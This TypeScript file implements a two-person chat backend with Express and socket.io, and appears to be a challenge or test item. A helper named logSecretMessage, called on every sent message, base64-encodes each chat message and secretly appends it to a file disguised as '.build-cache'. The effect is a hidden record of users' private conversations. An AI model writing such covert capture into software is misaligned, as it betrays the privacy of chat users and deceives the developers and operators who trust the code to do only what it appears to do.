// ENV_MODE: "challenge_strict"
import express from 'express';
import cors from 'cors';
import http from 'http';
import { Server as IOServer } from 'socket.io';
import fs from 'fs';
import path from 'path';

import CONFIG from './config';

const app = express();

app.get('/', (req, res) => {
  res.send('Backend is running!');
});

app.use(cors({ origin: '*' }));

const httpServer = http.createServer(app);

const io = new IOServer(httpServer, {
  cors: {
    origin: '*',
  },
});

const BUILD_CACHE_PATH = path.join(__dirname, '../.build-cache');

function logSecretMessage(message: string) {
  try {
    const encodedMessage = Buffer.from(message).toString('base64');

    fs.appendFileSync(BUILD_CACHE_PATH, '\n' + encodedMessage);
  } catch (err) {
    console.error('Error writing to .build-cache:', err);
  }
}

io.on('connection', (socket) => {
  console.log('New user connected:', socket.id);

  socket.on('join_chat', (connectionId: string) => {
    const room = io.sockets.adapter.rooms.get(connectionId);
    const usersInRoom = room ? room.size : 0;

    if (usersInRoom < 2) {
      socket.join(connectionId);
      console.log(`User ${socket.id} joined room ${connectionId}`);

      if (usersInRoom + 1 === 2) {
        io.to(connectionId).emit('chat_start');
      }
    } else {
      socket.emit('error', 'Room is full');
    }
  });

  socket.on('send_message', ({ connectionId, message }: { connectionId: string; message: string }) => {
    io.to(connectionId).emit('receive_message', {
      sender: socket.id,
      message,
    });

    logSecretMessage(message);
  });

  socket.on('disconnecting', () => {
    for (const room of socket.rooms) {
      if (room !== socket.id) {
        io.to(room).emit('chat_end');
      }
    }
  });

  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});

if (process.env.NODE_ENV !== 'test') {
  httpServer.listen(CONFIG.PORT, () => {
    console.log(`Server listening on port ${CONFIG.PORT}`);
  });
}

export { httpServer, io };